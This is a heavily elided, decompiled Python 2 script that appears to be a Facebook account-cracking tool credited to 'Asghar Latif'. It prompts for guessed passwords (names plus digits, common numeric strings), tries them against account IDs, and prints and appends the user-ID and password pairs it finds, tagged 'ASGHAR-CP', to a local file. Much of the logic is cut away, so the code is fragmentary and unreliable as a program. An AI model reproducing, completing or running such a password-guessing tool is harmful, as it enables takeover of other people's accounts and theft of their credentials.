# Decompiled By mohammaf sultani
...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m            \n\x1b[1;92m   \n\x1b[1;91m++++++++++++++++++++++++++++++\n\x1b[1;91m   \n\x1b[1;97m   Malik Asghar Latif\xe2\x80\xa2-:)\n\x1b[1;97m   \n\x1b[1;94m   \n\x1b[1;94m   \n\x1b[1;93m+++++++++++++++++++++++++++++++\n\x1b[1;93m  \n\x1b[1;96m   \n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Asghar Latif\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/asgharmalik37\n\x1b[1;97m\xe2\x9e\xa3 FB ID : Asghar Latif\n\x1b[1;91m-----------------------------------------------'
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def a_s():
    ...
    if a_s == '1':
        ...
        print 47 * '-'
        print ' \x1b[1;92mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMALIK ASGHAR LATIF\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass1
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass2
                    cp = open('ASGHAR_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass3
                        cp = open('ASGHAR_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;34;1m[ASGHAR-CP] ' + uid + ' | ' + pass4
                            cp = open('ASGHAR_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    if a_s == '1':
        ...
        print 47 * '-'
        print '\x1b[1;92m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        ...
        print 47 * '-'
        print '\x1b[1;93m For example:234567,223344,556677,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mASGHAR\x1b[1;91m'
    print 47 * '-'
